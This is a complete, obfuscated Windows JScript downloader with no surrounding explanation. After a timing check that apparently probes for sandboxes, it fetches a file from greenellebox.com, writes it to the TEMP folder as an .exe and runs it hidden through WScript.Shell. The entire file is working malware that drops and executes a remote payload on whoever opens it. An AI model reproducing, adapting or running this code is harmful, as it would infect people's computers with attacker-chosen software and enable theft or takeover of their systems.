var A0 = false;
var Y = "CreateObject";
var Y0 = function S() {return WScript[Y]("WScript.Shell");}(), fP = 11;
var I = "MSXML2.XMLHTTP";
var J = 2123213;
var d = 0;
function a(Uu){Y0["Run"](Uu, d, d);};
function b(){return "" + I;};
function u(vd, Dr){d = d * 1; return vd - Dr;};
function i(){return Y;};
/*@cc_on
  @if (@_win32 || @_win64)
    A0 = true;
  @end
@*/
if (A0)
{
var Mb = "";
function ED(){return 22;};
var Xp = 0; var A = 0;
function Qg()
{
var lk = new this["Date"]();
var a0 = lk["getUTCMilliseconds"]();
WScript["Sleep"](ED());
var lk = new this["Date"]();
var c = lk["getUTCMilliseconds"]();
WScript["Sleep"](ED());
var lk = new this["Date"]();
var P = lk["getUTCMilliseconds"]();
var Xp = "H";
Xp = u(c, a0);
var A = "Iu";
A = u(P, c);
Mb = "open";
return u(Xp, A);
}
var yn = false;
var qt = false;
for (var pM = d; pM < ED() * 1; pM++){if (Qg() != d){
yn = true; 
A = "31" + 11 * Xp + A; 
qt = true; 
break;
}}
function YN() {return ((yn == true) && (yn == qt)) ? 1 : d;};
if (yn && YN() && qt){
function j() {return Y0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "IlPOejc8HDTE5.exe";};
 ZF = b();
 W = WScript[Y](ZF);
 var D = 1;
 while (D){
try {
W[Mb]("GET", "http://greenellebox.com/a1odk", false);
W["send"]();
i0 = "Sleep";
for (;;){WScript[i0](ED() * 11); if (W["readystate"] >= 2 * 2) break;};
D = d;
} catch(PN){};
}
function My(va) {var zv = (1, 2, 3, 4, 5, va); return zv;};
TJ = WScript[i()]("ADODB.Stream");
ZF = TJ;
ZF[Mb]();
ZF["type"] = My(1);
ZF["write"](W["ResponseBody"]);
TJ["position"] = My(d);
ZF["Save" + "ToFile"](j(), 2);
TJ["c"+"lose"]();
K = j();
a(K);
}
}

